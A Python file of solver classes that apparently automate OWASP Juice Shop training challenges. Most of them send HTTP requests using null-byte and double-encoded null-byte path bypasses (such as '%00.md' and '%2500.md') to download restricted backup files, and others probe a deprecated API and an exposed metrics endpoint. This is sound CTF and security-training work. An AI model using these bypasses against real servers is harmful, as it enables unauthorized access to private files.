from core.base_solver import BaseSolver
from loguru import logger

class DeprecatedInterfaceSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "deprecatedInterfaceChallenge"

    def solve(self) -> bool:
        self.client.get("/b2b/v1/orders")
        return True

class ExposedMetricsSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "exposedMetricsChallenge"

    def solve(self) -> bool:
        res = self.client.get("/metrics")
        return res.status_code == 200

class ForgottenDevBackupSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "forgottenDevBackupChallenge"

    def solve(self) -> bool:
        # Try different bypasses for the file type restriction
        # %00 is often filtered, %2500 is double encoded null byte
        # Adding .md at the end to satisfy the endsWithAllowlistedFileType check
        paths = [
            "/ftp/package.json.bak%00.md", 
            "/ftp/package.json.bak%2500.md",
            "/ftp/package.json.bak%00.pdf"
        ]
        for path in paths:
            res = self.client.get(path)
            if res.status_code == 200: return True
        return False

class ForgottenSalesBackupSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "forgottenBackupChallenge"

    def solve(self) -> bool:
        paths = [
            "/ftp/coupons_2013.md.bak%00.md", 
            "/ftp/coupons_2013.md.bak%2500.md"
        ]
        for path in paths:
            res = self.client.get(path)
            if res.status_code == 200: return True
        return False

class MisplacedSignatureFileSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "misplacedSignatureFileChallenge"

    def solve(self) -> bool:
        paths = [
            "/ftp/suspicious_errors.yml%00.md", 
            "/ftp/suspicious_errors.yml%2500.md"
        ]
        for path in paths:
            res = self.client.get(path)
            if res.status_code == 200: return True
        return False

class EasterEggLevelOneSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "easterEggLevelOneChallenge"

    def solve(self) -> bool:
        paths = [
            "/ftp/eastere.gg%00.md", 
            "/ftp/eastere.gg%2500.md"
        ]
        for path in paths:
            res = self.client.get(path)
            if res.status_code == 200: return True
        return False

class NullByteChallengeSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "nullByteChallenge"

    def solve(self) -> bool:
        # The challenge is solved if any null byte exploit is successful.
        self.client.get("/ftp/legal.md%00.md")
        self.client.get("/ftp/legal.md%2500.md")
        return True


